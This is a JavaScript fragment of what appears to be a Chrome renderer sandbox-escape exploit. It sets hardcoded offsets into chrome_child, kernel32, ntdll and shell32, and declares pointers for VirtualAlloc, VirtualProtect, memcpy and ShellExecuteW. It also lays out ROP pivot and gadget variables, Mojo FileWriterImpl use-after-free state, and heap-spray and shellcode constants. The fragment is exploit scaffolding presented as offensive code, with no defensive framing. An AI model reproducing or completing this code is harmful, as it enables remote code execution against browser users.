/* =====================================================================
    GADGETS & DLL
===================================================================== */ 

// noob way of finding gadgets/dll bases
const OFFSET = {
    "CHROME_IM_VA": 0x052A47E0n,
    "KERNEL_EX_VP": 0x0001bc70n,
    "KERNEL_EX_WE": 0x00065f80n,
    "KERNEL_IM_MC": 0x000831f8n,
    "NTDLL______1": 0x000a2ae8n,
    "NTDLL______2": 0x0008b6e0n,
    "NTDLL______3": 0x00039997n,
    "CHROME_IM_SE": 0x052A4E08n,
    "SHELL______1": 0x000ecfd9n,
    "SHELL______2": 0x0001326dn,  
}

// libraries that we need to find in renderer address space
var chrome_child = null;
var kernel32 = null;
var ntdll = null;
var shell32 = null;

// pointers that we need for our pivot/rop chain
var virtual_alloc_ptr = 0n;
var virtual_protect_ptr = 0n;
var memcpy_ptr = 0n;
var shellexecutew_ptr = 0n;

// gadgets we need for our pivot/rop chain
var pivot_gadget_ptr = 0n;
var pop_gadget_ptr = 0n;
var ret_gadget_ptr = 0n;
var mov_rcx_rax_gadget_ptr = 0n;
var jmp_rcx_gadget_ptr = 0n;
var shell32_mov_rcx_rax_gadget_ptr = 0n;
var shell32_mov_rax_rcx_gadget_ptr = 0n;
var pop_rcx_ret_gadget = 0n;
var pop_rdx_ret_gadget = 0n;
var pop_r8_ret_gadget = 0n;
var pop_r9_r10_r11_ret_gadget = 0n;

/* =====================================================================
    MOJO RELATED
===================================================================== */ 

var blob_registry_ptr;
var file_system_manager_ptr;
var object_to_fill_freed_space;
var controlled_heap_space;

const kFileWriterImplSize = 0x140;
const kPageSize = 0x1000;
const kHugePageSize = 0x40000000;
const kChromeChildCoreOffset = 0x5318168n;

const kRopSize = 0x200;
const kSprayPtr = 0x40404040000n;
const kShellcodeSize = 0x800;
const kShellcodePageSize = 0x1000;

const kPtrToStartOfShellCodeBaseAddressOffset = 0xa00;
const kPtrToStartOfShellCode = kSprayPtr + BigInt(kPtrToStartOfShellCodeBaseAddressOffset);

/* =====================================================================
    EXPLOIT OPTIMISATION
===================================================================== */ 

const kAllocationCount = 0x100;
const kOptimisedSprayIterations = 2500;
const kOptimisedPipesNumber = 0xa00;